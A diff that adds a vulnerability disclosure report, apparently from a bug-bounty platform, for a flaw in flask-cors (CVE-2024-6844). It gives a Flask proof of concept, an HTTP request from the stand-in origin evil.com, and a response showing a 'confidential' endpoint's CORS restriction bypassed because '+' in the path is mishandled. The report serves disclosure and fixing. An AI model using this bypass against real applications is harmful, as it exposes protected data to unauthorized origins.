@@ -1,0 +1,79 @@
+Title: Inconsistent CORS Matching Due to Handling of "+" in URL Path in corydolphin/flask-cors
+
+Proof of Concept: 
+from flask import Flask, jsonify
+import logging
+try:
+    from flask_cors import CORS  # The typical way to import flask-cors
+except ImportError:
+    # Path hack allows examples to be run without installation.
+    import os
+    parentdir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+    os.sys.path.insert(0, parentdir)
+
+    from flask_cors import CORS
+
+
+app = Flask('FlaskCorsAppBasedExample')
+logging.basicConfig(level=logging.INFO)
+
+# To enable logging for flask-cors,
+logging.getLogger('flask_cors').level = logging.DEBUG
+
+CORS(app, resources={
+            r'/api/*': {'origins': ['*']},
+            r'/api/super\+Secret': {'origins': ['https://onlythis.com']}
+        })
+
+@app.route("/api/super+Secret")
+def secret():
+    return "Very Confidential. Only serve to https://onlythis.com"
+
+@app.route("/api/v1/users/")
+def list_users():
+    return jsonify(user="joe")
+
+
+if __name__ == "__main__":
+    app.run(debug=True)
+
+Request:
+
+GET /api/super+Secret HTTP/1.1
+Host: 127.0.0.1:5000
+Origin: https://evil.com
+Connection: close
+
+Response:
+
+HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 53
+Access-Control-Allow-Origin: https://evil.com
+Vary: Origin
+Server: Werkzeug/1.0.1 Python/3.9.5
+Date: Sat, 11 May 2024 20:10:28 GMT
+
+Very Confidential. Only serve to https://onlythis.com
+
+Impact: 
+The incorrect conversion of + to a space in URL paths can cause legitimate requests to miss their intended CORS policies, potentially allowing unauthorized cross-origin access or blocking valid requests. This misconfiguration creates security vulnerabilities and usability issues, making it difficult for developers to apply precise CORS rules.
+
+CVE ID: CVE-2024-6844
+Status: (assigned)
+Vulnerability Type: CWE-840: Business Logic Errors
+Severity: Medium (5.3)
+Attack Vector: Network
+Attack Complexity: Low
+Privileges Required: None
+User Interaction: None
+Scope: Unchanged
+Confidentiality: Low
+Integrity: None
+Availability: None
+Registry: Pypi
+Affected Version: 4.0.1
+Visibility: Public
+Status: Awaiting fix
+Disclosure Bounty: $125
+Fix Bounty: $31.25
